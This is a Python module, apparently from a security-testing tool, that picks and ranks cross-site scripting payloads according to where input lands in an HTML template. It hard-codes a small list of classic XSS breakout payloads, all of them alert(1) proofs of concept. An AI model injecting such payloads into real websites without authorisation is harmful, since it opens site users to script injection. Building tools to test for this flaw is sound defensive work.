"""HTML / XSS injection payload mutation engine."""

from __future__ import annotations

from dataclasses import dataclass, field

from ..models import Context, Risk
from .context import analyze_xss_context

_TEXT_BODIES = [
    ("<script>alert(1)</script>", "script-element"),
    ("<img src=x onerror=alert(1)>", "img-onerror"),
    ("<svg onload=alert(1)>", "svg-onload"),
]

_ATTR_BODIES = [
    ('"><script>alert(1)</script>', "close-double-quote"),
    ("'><script>alert(1)</script>", "close-single-quote"),
    ('" onmouseover="alert(1)', "double-quote-event"),
    ("javascript:alert(1)", "js-url"),
]

_SCRIPT_BODIES = [
    ("</script><script>alert(1)</script>", "close-script"),
    ("';alert(1);//", "js-string-break"),
]

_COMMENT_BODIES = [
    ("--><script>alert(1)</script>", "close-comment"),
]

_RISK_ORDER = {
    Risk.CRITICAL: 4,
    Risk.HIGH: 3,
    Risk.MEDIUM: 2,
    Risk.LOW: 1,
    Risk.NONE: 0,
}


@dataclass
class XssCandidate:
    payload: str
    risk: Risk
    command_injected: bool
    syntax_valid: bool
    strategy: str


@dataclass
class XssMutationResult:
    template: str
    context: Context
    generated: int
    valid: int
    candidates: list[XssCandidate] = field(default_factory=list)

    @property
    def high_probability(self) -> list[str]:
        return [c.payload for c in self.candidates[:10]]

    def to_dict(self) -> dict:
        return {
            "template": self.template,
            "context": self.context.value,
            "generated": self.generated,
            "valid": self.valid,
            "high_probability": self.high_probability,
            "candidates": [
                {
                    "payload": c.payload,
                    "risk": c.risk.value,
                    "command_injected": c.command_injected,
                    "syntax_valid": c.syntax_valid,
                    "strategy": c.strategy,
                }
                for c in self.candidates
            ],
        }


def _bodies(context: Context):
    return {
        Context.HTML_TEXT: _TEXT_BODIES,
        Context.HTML_ATTR: _ATTR_BODIES,
        Context.HTML_SCRIPT: _SCRIPT_BODIES,
        Context.HTML_COMMENT: _COMMENT_BODIES,
    }.get(context, _TEXT_BODIES)


def mutate_xss(template: str) -> XssMutationResult:
    """Generate and rank XSS payloads for ``template``."""
    from .analyzer import analyze_xss

    context = analyze_xss_context(template)
    generated = _bodies(context)

    candidates: list[XssCandidate] = []
    for payload, strategy in generated:
        result = analyze_xss(template, payload)
        b = result.breakout
        if b.command_injected or "js-url" in b.separators:
            candidates.append(
                XssCandidate(
                    payload=payload,
                    risk=result.risk,
                    command_injected=b.command_injected,
                    syntax_valid=result.balance.syntax_valid,
                    strategy=strategy,
                )
            )

    candidates.sort(
        key=lambda c: (_RISK_ORDER[c.risk], c.syntax_valid, -len(c.payload)),
        reverse=True,
    )

    return XssMutationResult(
        template=template,
        context=context,
        generated=len(generated),
        valid=len(candidates),
        candidates=candidates,
    )
